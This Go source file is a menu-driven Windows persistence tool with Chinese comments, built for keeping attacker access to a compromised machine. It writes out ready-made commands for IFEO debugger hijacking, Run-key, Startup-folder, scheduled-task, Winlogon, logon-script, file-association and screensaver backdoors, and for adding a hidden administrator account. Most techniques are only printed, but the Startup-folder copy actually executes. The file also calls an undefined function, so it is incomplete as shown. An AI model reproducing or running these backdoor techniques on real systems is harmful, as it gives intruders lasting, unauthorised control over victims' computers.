package main

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 权限维持技术结构体
type PersistenceTechnique struct {
	Name        string
	Description string
	Function    func(args ...string) error
}

// 全局变量
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	shell32  = windows.NewLazySystemDLL("shell32.dll")
)

// 0x02 辅助功能镜像劫持
func ifeoHijack(targetExe, debuggerExe string) error {
	fmt.Printf("[*] 正在设置IFEO镜像劫持: %s -> %s\n", targetExe, debuggerExe)

	// 这里应该使用Windows注册表API
	// 为了演示，我们只是打印命令
	cmd := fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s" /v "Debugger" /t REG_SZ /d "%s" /f`, targetExe, debuggerExe)
	fmt.Printf("执行命令: %s\n", cmd)

	fmt.Printf("[+] IFEO镜像劫持设置成功\n")
	return nil
}

// 0x03 启动项后门
func startupBackdoor(exePath, valueName string) error {
	fmt.Printf("[*] 正在设置启动项后门: %s\n", exePath)

	// 获取启动目录
	startupPath, err := getStartupPath()
	if err != nil {
		return fmt.Errorf("获取启动目录失败: %v", err)
	}

	// 复制文件到启动目录
	destPath := filepath.Join(startupPath, filepath.Base(exePath))
	err = copyFile(exePath, destPath)
	if err != nil {
		return fmt.Errorf("复制文件失败: %v", err)
	}

	fmt.Printf("[+] 启动项后门设置成功: %s\n", destPath)
	return nil
}

// 注册表启动项后门
func registryStartupBackdoor(exePath, valueName string, useHKCU bool) error {
	fmt.Printf("[*] 正在设置注册表启动项后门: %s\n", exePath)

	var cmd string
	if useHKCU {
		cmd = fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`, valueName, exePath)
	} else {
		cmd = fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`, valueName, exePath)
	}

	fmt.Printf("执行命令: %s\n", cmd)
	fmt.Printf("[+] 注册表启动项后门设置成功\n")
	return nil
}

// 0x04 计划任务后门
func scheduledTaskBackdoor(taskName, exePath string, intervalMinutes int) error {
	fmt.Printf("[*] 正在设置计划任务后门: %s\n", taskName)

	cmd := fmt.Sprintf(`schtasks /create /sc minute /mo %d /tn "%s" /tr "%s" /f`, intervalMinutes, taskName, exePath)

	output, err := executeCommand(cmd)
	if err != nil {
		return fmt.Errorf("创建计划任务失败: %v", err)
	}

	fmt.Printf("[+] 计划任务后门设置成功\n输出: %s\n", output)
	return nil
}

// 0x06 Winlogon后门
func winlogonBackdoor(exePath string) error {
	fmt.Printf("[*] 正在设置Winlogon后门: %s\n", exePath)

	cmd := fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,%s," /f`, exePath)

	fmt.Printf("执行命令: %s\n", cmd)
	fmt.Printf("[+] Winlogon后门设置成功\n")
	return nil
}

// 0x07 Logon Scripts后门
func logonScriptsBackdoor(scriptPath string) error {
	fmt.Printf("[*] 正在设置Logon Scripts后门: %s\n", scriptPath)

	cmd := fmt.Sprintf(`reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "%s" /f`, scriptPath)

	fmt.Printf("执行命令: %s\n", cmd)
	fmt.Printf("[+] Logon Scripts后门设置成功\n")
	return nil
}

// 0x08 文件关联后门
func fileAssociationBackdoor(extension, exePath string) error {
	fmt.Printf("[*] 正在设置文件关联后门: %s -> %s\n", extension, exePath)

	cmd := fmt.Sprintf(`reg add "HKCR\%sfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "\"%s\" \"%%1\"" /f`, extension, exePath)

	fmt.Printf("执行命令: %s\n", cmd)
	fmt.Printf("[+] 文件关联后门设置成功\n")
	return nil
}

// 0x11 屏幕保护程序后门
func screensaverBackdoor(exePath string) error {
	fmt.Printf("[*] 正在设置屏幕保护程序后门: %s\n", exePath)

	cmd := fmt.Sprintf(`reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /d "%s" /f`, exePath)

	fmt.Printf("执行命令: %s\n", cmd)
	fmt.Printf("[+] 屏幕保护程序后门设置成功\n")
	return nil
}

// 0x13 影子用户创建
func createShadowUser(username, password string) error {
	fmt.Printf("[*] 正在创建影子用户: %s\n", username)

	// 创建用户
	cmd := fmt.Sprintf(`net user %s %s /add`, username, password)
	_, err := executeCommand(cmd)
	if err != nil {
		return fmt.Errorf("创建用户失败: %v", err)
	}

	// 添加到管理员组
	cmd = fmt.Sprintf(`net localgroup administrators %s /add`, username)
	_, err = executeCommand(cmd)
	if err != nil {
		return fmt.Errorf("添加用户到管理员组失败: %v", err)
	}

	fmt.Printf("[+] 影子用户创建成功: %s\n", username)
	return nil
}

// 辅助函数
func getStartupPath() (string, error) {
	// 使用SHGetSpecialFolderPath获取启动目录
	var path [260]uint16
	ret, _, _ := shell32.NewProc("SHGetSpecialFolderPathW").Call(
		0,
		uintptr(unsafe.Pointer(&path[0])),
		0x7, // CSIDL_STARTUP
		1,   // fCreate
	)

	if ret == 0 {
		return "", fmt.Errorf("获取启动目录失败")
	}

	return windows.UTF16ToString(path[:]), nil
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = dstFile.ReadFrom(srcFile)
	return err
}

func executeCommand(cmd string) (string, error) {
	// 这里应该实现命令执行逻辑
	// 为了演示，我们只是打印命令
	fmt.Printf("执行命令: %s\n", cmd)
	return "命令执行成功", nil
}

// 主菜单
func showMenu() {
	fmt.Println("\n=== Windows权限维持工具 ===")
	fmt.Println("1. IFEO镜像劫持")
	fmt.Println("2. 启动项后门")
	fmt.Println("3. 注册表启动项后门")
	fmt.Println("4. 计划任务后门")
	fmt.Println("5. Winlogon后门")
	fmt.Println("6. Logon Scripts后门")
	fmt.Println("7. 文件关联后门")
	fmt.Println("8. 屏幕保护程序后门")
	fmt.Println("9. 创建影子用户")
	fmt.Println("10. 高级功能")
	fmt.Println("0. 退出")
	fmt.Print("请选择操作: ")
}

func main() {
	fmt.Println("Windows权限维持工具 - Go语言版本")
	fmt.Println("注意: 部分功能需要管理员权限")

	techniques := []PersistenceTechnique{
		{"IFEO镜像劫持", "通过修改注册表实现程序劫持", func(args ...string) error {
			if len(args) < 2 {
				return fmt.Errorf("需要目标程序和调试器程序路径")
			}
			return ifeoHijack(args[0], args[1])
		}},
		{"启动项后门", "将程序复制到启动目录", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要程序路径")
			}
			return startupBackdoor(args[0], "backdoor")
		}},
		{"注册表启动项后门", "通过注册表设置启动项", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要程序路径")
			}
			return registryStartupBackdoor(args[0], "backdoor", true)
		}},
		{"计划任务后门", "创建定时执行的任务", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要程序路径")
			}
			return scheduledTaskBackdoor("backdoor", args[0], 5)
		}},
		{"Winlogon后门", "修改用户登录初始化程序", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要程序路径")
			}
			return winlogonBackdoor(args[0])
		}},
		{"Logon Scripts后门", "设置登录脚本", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要脚本路径")
			}
			return logonScriptsBackdoor(args[0])
		}},
		{"文件关联后门", "修改文件关联执行恶意程序", func(args ...string) error {
			if len(args) < 2 {
				return fmt.Errorf("需要文件扩展名和程序路径")
			}
			return fileAssociationBackdoor(args[0], args[1])
		}},
		{"屏幕保护程序后门", "修改屏幕保护程序", func(args ...string) error {
			if len(args) < 1 {
				return fmt.Errorf("需要程序路径")
			}
			return screensaverBackdoor(args[0])
		}},
		{"创建影子用户", "创建隐藏的管理员用户", func(args ...string) error {
			if len(args) < 2 {
				return fmt.Errorf("需要用户名和密码")
			}
			return createShadowUser(args[0], args[1])
		}},
	}

	for {
		showMenu()

		var choice int
		fmt.Scanf("%d", &choice)

		if choice == 0 {
			fmt.Println("退出程序")
			break
		}

		if choice == 10 {
			// 调用高级功能
			handleAdvancedFeatures()
			continue
		}

		if choice < 1 || choice > len(techniques) {
			fmt.Println("无效选择")
			continue
		}

		technique := techniques[choice-1]
		fmt.Printf("\n[*] 选择的技术: %s\n", technique.Name)
		fmt.Printf("[*] 描述: %s\n", technique.Description)

		// 根据技术类型获取参数
		var args []string
		switch choice {
		case 1: // IFEO
			fmt.Print("输入目标程序名 (如: notepad.exe): ")
			var target string
			fmt.Scanf("%s", &target)
			fmt.Print("输入调试器程序路径: ")
			var debugger string
			fmt.Scanf("%s", &debugger)
			args = []string{target, debugger}
		case 2, 3, 4, 5, 8: // 需要程序路径
			fmt.Print("输入程序路径: ")
			var path string
			fmt.Scanf("%s", &path)
			args = []string{path}
		case 6: // Logon Scripts
			fmt.Print("输入脚本路径: ")
			var script string
			fmt.Scanf("%s", &script)
			args = []string{script}
		case 7: // 文件关联
			fmt.Print("输入文件扩展名 (如: txt): ")
			var ext string
			fmt.Scanf("%s", &ext)
			fmt.Print("输入程序路径: ")
			var path string
			fmt.Scanf("%s", &path)
			args = []string{ext, path}
		case 9: // 影子用户
			fmt.Print("输入用户名: ")
			var username string
			fmt.Scanf("%s", &username)
			fmt.Print("输入密码: ")
			var password string
			fmt.Scanf("%s", &password)
			args = []string{username, password}
		}

		// 执行技术
		err := technique.Function(args...)
		if err != nil {
			fmt.Printf("[!] 执行失败: %v\n", err)
		} else {
			fmt.Printf("[+] %s 执行成功\n", technique.Name)
		}

		fmt.Println("\n按回车键继续...")
		fmt.Scanln()
	}
}
